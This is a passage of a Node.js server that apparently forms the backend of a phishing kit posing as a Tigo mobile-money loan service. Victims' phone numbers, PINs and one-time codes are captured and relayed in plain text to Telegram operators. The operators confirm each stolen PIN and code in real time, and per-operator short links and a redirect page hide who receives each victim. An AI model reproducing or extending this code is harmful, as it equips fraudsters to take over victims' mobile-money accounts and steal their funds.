        }

        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber, pin,
            pinStatus: 'pending', otpStatus: 'pending',
            isReturningUser,
            previousCount: pastApps.length,
            timestamp: new Date().toISOString()
        });

        const userLabel = isReturningUser ? '🔄 *RETURNING USER*' : '📱 *NEW APPLICATION*';
        await sendToAdmin(assignedAdmin.adminId, `${userLabel}\n\n📋 \`${applicationId}\`\n📱 ${phoneNumber}\n🔑 \`${pin}\`\n⏰ ${new Date().toLocaleString()}${historyText}\n\n⚠️ *VERIFY INFORMATION*`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        processingLocks.delete(lockKey);
        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

    } catch (error) {
        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;

        // ✅ BLOCK: No application ID = no session = reject
        if (!applicationId) {
            return res.status(403).json({ success: false, message: 'Invalid session.' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `📲 *CODE VERIFICATION*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔢 \`${otp}\`\n⏰ ${new Date().toLocaleString()}\n\n⚠️ *VERIFY CODE*`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        if (!applicationId) return res.status(403).json({ success: false, message: 'Invalid session.' });

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });

        await sendToAdmin(application.adminId, `🔄 *OTP RESEND REQUEST*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n\nUser requested OTP resend.`, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        botMode: 'webhook',
        timestamp: new Date().toISOString()
    });
});

// ==========================================
// PAGE ROUTES
// ==========================================

// ✅ BLOCK: Root URL without short code → invalid page
app.get('/', (req, res) => {
    // Legacy ?admin= links still work during transition
    if (req.query.admin) {
        console.log(`⚠️ Legacy admin link used: ${req.query.admin}`);
        // Store admin ID via bridge page then redirect
        return res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script>
            sessionStorage.setItem('selectedAdminId', '${req.query.admin.replace(/['"<>]/g, '')}');
            sessionStorage.setItem('validLink', 'true');
            window.location.replace('/index.html');
        </script></body></html>`);
    }
    // No code = dead end
    res.sendFile(path.join(__dirname, 'invalid-link.html'));
});

// ✅ SHORT CODE ROUTE — the main entry point for all users
app.get('/:code([a-z0-9]{3,10})', async (req, res) => {
    const code = req.params.code.toLowerCase();

    // Skip reserved paths
    const reserved = ['index.html', 'application.html', 'verification.html', 'otp.html', 'approval.html', 'invalid-link.html', 'style.css', 'admin-select.html'];
    if (reserved.some(r => code === r.replace('.html', '') || code === r)) {
        return res.sendFile(path.join(__dirname, req.params.code));
    }

    try {
        const admin = await db.getAdminByShortCode(code);

        if (!admin || admin.status !== 'active' || pausedAdmins.has(admin.adminId)) {
            console.log(`🚫 Invalid/inactive short code: ${code}`);
            return res.sendFile(path.join(__dirname, 'invalid-link.html'));
        }

        // Ensure admin is in active map
        if (!adminChatIds.has(admin.adminId) && admin.chatId) {
            adminChatIds.set(admin.adminId, admin.chatId);
        }

        console.log(`✅ Short code ${code} → ${admin.name} (${admin.adminId})`);

        // ✅ Bridge page: store admin ID in sessionStorage then redirect — admin ID never in URL
        res.send(`<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mkopo wa Tigo — Inapakia...</title>
    <style>
        body { margin:0; min-height:100vh; background:linear-gradient(135deg,#667eea,#764ba2); display:flex; align-items:center; justify-content:center; font-family:sans-serif; }
        .loader { text-align:center; color:white; }
        .spinner { width:48px; height:48px; border:4px solid rgba(255,255,255,0.3); border-top:4px solid white; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 16px; }
        @keyframes spin { to { transform:rotate(360deg); } }
        p { font-size:16px; opacity:0.9; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Inapakia...</p>
    </div>
    <script>
        sessionStorage.setItem('selectedAdminId', '${admin.adminId}');
        sessionStorage.setItem('validLink', 'true');
        window.location.replace('/index.html');
    </script>
</body>
</html>`);
    } catch (error) {
        console.error('❌ Error in short code route:', error);
        res.sendFile(path.join(__dirname, 'invalid-link.html'));
    }
});

// ==========================================
// SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n👑 TIGO LOAN PLATFORM — SHORT CODE MODE`);
    console.log(`=========================================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🔑 Links: yoursite.com/XXXXX (5-char codes)`);
    console.log(`🚫 Auto-assign: DISABLED`);
    console.log(`🔒 Direct access: BLOCKED`);
    console.log(`\n✅ Ready!\n`);
});

async function shutdownGracefully(signal) {
    console.log(`\n🛑 ${signal} — shutting down...`);
    try { await bot.deleteWebHook(); await db.closeDatabase(); process.exit(0); }
    catch (e) { console.error('❌ Shutdown error:', e); process.exit(1); }
}
process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));
process.on('unhandledRejection', (e) => console.error('❌ Unhandled rejection:', e?.message));
process.on('uncaughtException', (e) => console.error('❌ Uncaught exception:', e?.message));
